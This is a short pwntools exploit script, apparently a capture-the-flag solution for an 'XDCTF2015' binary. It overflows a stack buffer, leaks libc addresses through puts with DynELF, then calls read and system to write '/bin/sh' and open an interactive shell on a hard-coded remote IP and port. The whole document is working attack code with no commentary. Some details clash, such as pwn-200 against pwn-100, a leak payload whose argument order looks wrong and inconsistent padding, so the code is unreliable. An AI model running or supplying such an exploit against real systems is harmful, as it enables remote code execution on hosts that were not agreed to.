from pwn import *
#p=process('./pwn-200')
p=remote('111.200.241.244',57045)
elf=ELF('./pwn-100')
puts_plt=elf.plt['puts']
read_plt=elf.plt['read']
main_addr=elf.symbols['main']
def leak(addr):	
	payload='a'*0x40+'bbbb'+p32(addr)+p32(puts_plt)+p32(main_addr)
	p.sendlineafter('Welcome to XDCTF2015~!',payload)
	data=p.recv()
	return data
d=DynELF(leak,elf=ELF('./pwn-100'))
sys_addr=d.lookup('__libc_system','libc')
log.success('system:'+hex(sys_addr))
bss_addr=elf.bss()
log.success('bss:'+hex(bss_addr))
payload='a'*0x40+p32(read_plt)+p32(sys_addr)+p32(0)+p32(bss_addr)+p32(8)+'AAAA'+p32(bss_addr)
p.sendlineafter('Welcome to XDCTF2015~!',payload)
p.sendline('/bin/sh')
p.interactive()

	
